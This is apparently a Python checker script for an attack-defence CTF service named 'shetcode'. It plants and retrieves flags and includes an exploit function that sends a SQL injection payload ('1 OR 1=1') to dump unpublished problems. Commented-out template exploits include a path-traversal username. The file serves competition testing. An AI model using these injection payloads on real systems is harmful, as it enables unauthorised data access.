from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import json
import re
from httpx import AsyncClient

from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 8055
checker = Enochecker("shetcode", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

class Connection:
    def __init__(self, logger: LoggerAdapter, client: AsyncClient):
        self.client = client
        self.logger = logger

    async def register_user(self, username: str, password: str):
        response = await self.client.post(
            "/register",
            data={"username": username, "password": password}
        )
        data = response.json()
        
        if data.get("success") == False or response.status_code not in [200, 201, 302]:
            raise MumbleException("Failed to register user")

    async def login_user(self, username: str, password: str):
        response = await self.client.post(
            "/login",
            data={"username": username, "password": password}
        )
        data = response.json()
        
        if data.get("success") == False or response.status_code not in [200, 201, 302]:
            raise MumbleException("Failed to log in!")


@checker.register_dependency
def _get_connection(client: AsyncClient, logger: LoggerAdapter) -> Connection:
    return Connection(logger, client)


"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_drafts(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    conn = Connection(logger, client)
    username: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    await conn.register_user(username, password)

    await conn.login_user(username, password)

    problem_title = "problem_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    
    try: 
        headers = {"Accept": "application/json"}
        response = await conn.client.post(
            "/problems/create",
            headers=headers,
            data={
                "title": problem_title,
                "description": task.flag,
                "difficulty": random.choice(["easy", "medium", "hard"]),
                "testCases": json.dumps(["sample input"]),
                "expectedOutputs": json.dumps(["sample output"]),
                "isPublished": "false",
                "isPrivate": "false",
                "maxRuntime": "1.0"
            }
        )
        
        data = response.json()
        
        if response.status_code != 200 or not data.get("success"):
            error_msg = data.get("message", "Unknown error")
            raise MumbleException(f"Failed to post flag: {error_msg}")
        
        problem_id = data.get("problem_id")
        if not problem_id:
            raise MumbleException("No problem ID in response")
        
        # Store the username, password, and problem ID
        await db.set("userdata", (username, password, problem_id))
        
    except Exception as ex:
        raise MumbleException(f"Error posting flag: {ex}")
        
    return username


@checker.getflag(0)
async def getflag_note(
    task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
) -> None:
    try:
        username, password, problem_id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    conn = Connection(logger, client)

    await conn.login_user(username, password)

    response = await conn.client.get(f"/problems/details/{problem_id}")
    
    if response.status_code != 200:
        raise MumbleException(f"Failed to retrieve problem. Status code: {response.status_code}")
    
    content = response.text
    
    # Check if flag is in the response
    if task.flag not in content:
        raise MumbleException("Flag was not found in the problem content")


# @checker.putnoise(0)
# async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to the service")
#     welcome = await conn.reader.readuntil(b">")

#     # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     randomNote = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=36)
#     )

#     # Register another user
#     await conn.register_user(username, password)

#     # Now we need to login
#     await conn.login_user(username, password)

#     # Finally, we can post our note!
#     logger.debug(f"Sending command to save a note")
#     conn.writer.write(f"set {randomNote}\n".encode())
#     await conn.writer.drain()
#     await conn.reader.readuntil(b"Note saved! ID is ")

#     try:
#         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#     except Exception as ex:
#         logger.i(f"Failed to retrieve note: {ex}")
#         raise MumbleException("Could not retrieve NoteId")

#     assert_equals(len(noteId) > 0, True, message="Empty noteId received")

#     logger.debug(f"{noteId}")

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()

#     await db.set("userdata", (username, password, noteId, randomNote))
        
# @checker.getnoise(0)
# async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#     try:
#         (username, password, noteId, randomNote) = await db.get('userdata')
#     except:
#         raise MumbleException("Putnoise Failed!") 

#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # Let's login to the service
#     await conn.login_user(username, password)

#     # Let´s obtain our note.
#     logger.debug(f"Sending command to retrieve note: {noteId}")
#     conn.writer.write(f"get {noteId}\n".encode())
#     await conn.writer.drain()
#     data = await conn.reader.readuntil(b">")
#     if not randomNote.encode() in data:
#         raise MumbleException("Resulting flag was found to be incorrect")

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()


# @checker.havoc(0)
# async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 0, we'll check if the help text is available
#     logger.debug(f"Sending help command")
#     conn.writer.write(f"help\n".encode())
#     await conn.writer.drain()
#     helpstr = await conn.reader.readuntil(b">")

#     for line in [
#         "This is a notebook service. Commands:",
#         "reg USER PW - Register new account",
#         "log USER PW - Login to account",
#         "set TEXT..... - Set a note",
#         "user  - List all users",
#         "list - List all notes",
#         "exit - Exit!",
#         "dump - Dump the database",
#         "get ID",
#     ]:
#         assert_in(line.encode(), helpstr, "Received incomplete response.")

# @checker.havoc(1)
# async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 1, we'll check if the `user` command still works.
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )

#     # Register and login a dummy user
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     logger.debug(f"Sending user command")
#     conn.writer.write(f"user\n".encode())
#     await conn.writer.drain()
#     ret = await conn.reader.readuntil(b">")
#     if not b"User 0: " in ret:
#         raise MumbleException("User command does not return any users")

#     if username:
#         assert_in(username.encode(), ret, "Flag username not in user output")

#     # conn.writer.close()
#     # await conn.writer.wait_closed()

# @checker.havoc(2)
# async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 2, we'll check if the `list` command still works.
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     randomNote = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=36)
#     )

#     # Register and login a dummy user
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     logger.debug(f"Sending command to save a note")
#     conn.writer.write(f"set {randomNote}\n".encode())
#     await conn.writer.drain()
#     await conn.reader.readuntil(b"Note saved! ID is ")

#     try:
#         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#     except Exception as ex:
#         logger.debug(f"Failed to retrieve note: {ex}")
#         raise MumbleException("Could not retrieve NoteId")

#     assert_equals(len(noteId) > 0, True, message="Empty noteId received")

#     logger.debug(f"{noteId}")

#     logger.debug(f"Sending list command")
#     conn.writer.write(f"list\n".encode())
#     await conn.writer.drain()

#     data = await conn.reader.readuntil(b">")
#     if not noteId.encode() in data:
#         raise MumbleException("List command does not work as intended")

@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    username: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    conn = Connection(logger, client)
    await conn.register_user(username, password)
    await conn.login_user(username, password)

    response = await conn.client.post(
        "/api/problems",
        data={"author_id": "1 OR 1=1"} # SQL injection to get all problems
    )
    
    if response.status_code not in [200, 201, 302]:
        logger.debug(f"Failed to exploit service: HTTP {response.status_code, response.text}")
        raise MumbleException(f"Failed to exploit service: HTTP {response.status_code}")
    
    logger.debug(f"Exploit response: {response.text}")
    data = response.json()
    logger.debug(f"Exploit response: {data}")
    
    for problem in data:
        if not problem.get("is_published", False):
            description = problem.get("description", "")
            if flag := searcher.search_flag(description):
                return flag
    
    raise MumbleException("No flag found in any problem description")

# @checker.exploit(1)
# async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"user\n")
#     await conn.writer.drain()

#     # TODO: Use flag hints
#     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#     for user in user_list:
#         user_name = user.split()[-1]
#         conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
#         await conn.writer.drain()
#         await conn.reader.readuntil(b">")  # successfully registered
#         await conn.reader.readuntil(b">")  # successfully logged in
#         notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#         for note in notes_list:
#             note_id = note.split()[-1]
#             conn.writer.write(b"get %s\n" % note_id)
#             await conn.writer.drain()
#             data = await conn.reader.readuntil(b">")
#             if flag := searcher.search_flag(data):
#                 return flag
#     raise MumbleException("flag not found")

# @checker.exploit(2)
# async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"user\n")
#     await conn.writer.drain()

#     # TODO: Use flag hints?
#     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#     for user in user_list:
#         user_name = user.split()[-1]
#         conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
#         await conn.writer.drain()
#         await conn.reader.readuntil(b">")  # successfully registered
#         await conn.reader.readuntil(b">")  # successfully logged in
#         notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#         for note in notes_list:
#             note_id = note.split()[-1]
#             conn.writer.write(b"get %s\n" % note_id)
#             await conn.writer.drain()
#             data = await conn.reader.readuntil(b">")
#             if flag := searcher.search_flag(data):
#                 return flag
#     raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()